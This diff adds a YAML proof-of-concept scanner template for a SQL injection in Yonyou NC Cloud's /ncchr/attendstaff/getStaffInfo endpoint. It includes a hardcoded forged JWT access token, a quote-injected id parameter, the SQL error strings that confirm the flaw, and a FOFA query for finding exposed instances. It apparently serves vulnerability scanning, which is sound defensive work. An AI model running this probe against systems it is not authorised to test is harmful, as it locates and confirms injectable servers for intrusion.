@@ -1,0 +1,41 @@
+id: poc-yaml-yongyou-nc-cloud-getstaffinfo-sqli
+info:
+  name: 用友NC Cloud getStaffInfo SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友-NC-Cloud
+  fofa: app="用友-NC-Cloud"
+requests:
+- method: GET
+  path: /ncchr/attendstaff/getStaffInfo?id=1
+  headers:
+    Accesstokenncc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+  expression: 'status_code == 400 &&
+
+    contains(body,"获取人员信息失败") &&
+
+    contains(body,"yonyou.hrcloud") &&
+
+    contains(content_type,"application/json") &&
+
+    !contains(body,"<")
+
+    '
+- method: GET
+  path: /ncchr/attendstaff/getStaffInfo?id=1')
+  headers:
+    Accesstokenncc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+  expression: 'status_code == 500 &&
+
+    contains(body,"SQL 命令未正确结束") &&
+
+    contains(body,"yonyou.hrcloud") &&
+
+    contains(content_type,"application/json") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
